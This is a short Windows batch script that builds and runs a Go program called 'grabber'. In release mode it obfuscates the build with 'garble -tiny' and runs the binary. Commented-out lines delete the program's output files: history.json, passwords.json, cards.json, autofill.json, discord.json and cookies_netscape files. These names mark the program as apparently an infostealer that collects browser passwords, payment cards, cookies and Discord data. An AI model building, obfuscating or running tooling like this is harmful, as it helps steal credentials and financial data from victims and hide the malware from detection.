@echo off

cd /d %~dp0

if "%1"=="" (
    set "debug=0"
) else (
    set "debug=%1"
)

set GOOS=windows

if %debug%==0 (
    garble -tiny build .

    grabber.exe

    REM del history.json || echo "history.json not found"
    REM del passwords.json || echo "passwords.json not found"
    REM del cards.json || echo "cards.json not found"
    REM del downloads.json || echo "downloads.json not found"
    REM del autofill.json || echo "autofill.json not found"
    REM del discord.json || echo "discord.json not found"
REM 
    REM REM delete all files that start with cookies_netscape
    REM for /f "delims=" %%i in ('dir /b cookies_netscape*') do del "%%i"

) else (
    go build .

    grabber.exe

)

pause

del grabber.exe || echo "grabber.exe not found"

pause
exit